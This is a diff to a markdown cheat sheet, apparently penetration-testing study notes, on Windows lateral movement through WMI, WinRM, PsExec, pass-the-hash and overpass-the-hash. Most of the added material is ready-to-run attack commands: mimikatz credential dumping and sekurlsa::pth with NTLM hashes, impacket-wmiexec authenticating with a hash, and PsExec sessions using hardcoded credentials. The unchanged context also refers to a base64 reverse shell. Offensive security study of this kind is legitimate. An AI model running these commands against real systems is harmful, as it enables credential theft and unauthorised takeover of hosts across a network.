@@ -1,6 +1,7 @@
 #### Use Wmi
->>
-// require Administrators local group, and login as a user in the compromised host, run this to make it for the target host
+*require Administrators local group, and login as a user in the compromised host, run this to make it for the target host\.*
+
+*through Remote Procedure Calls (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.*
 ###### Rev_shell as base64
 ```
 import sys
@@ -45,6 +46,7 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 ```
 
 #### Use Winrm
+*uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.*
 ###### CMD
 `winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"`
 //replace command 
@@ -66,4 +68,42 @@ New-PSSession -ComputerName 192.168.50.73 -Credential $credential
 >  1 WinRM1          192.168.123.72  RemoteMachine   Opened        Microsoft.PowerShell     Available
 
 Enter-PSSession 1
+```
+
+#### PsExec
+- the user that authenticates to the target machine needs to be part of the Administrators local group.
+- the ADMIN$ share must be available
+- File and Printer Sharing has to be turned on.
+the last two requirements are already met as they are the default settings on modern Windows Server systems.
+//From compromised host to target one
+`.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd`
+
+#### PtH
+- it requires an SMB connection through the firewall (commonly port 445)
+- the Windows File and Printer Sharing feature to be enabled.
+- the admin share called ADMIN$ to be available
+
+```
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:25d55ad283aa400af464c76d713c07ad /run:cmd.exe"
+
+PsExec.exe \\192.168.1.10 cmd.exe
+
+//or from Kali
+impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+```
+
+#### Overpass the hash
+*turn the NTLM hash into a Kerberos ticket*
+*we owned user1, and login a host, where user2 cache hash there, we grab hash via mimikatz*
+```
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::pth /user:user2 /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+
+//now have a shell with priv of user2. if user2 have admin of host2, authenticate it 
+net use \\host2
+klist
+//use this TGT to login
+.\PsExec.exe \\host2 cmd
+
 ```
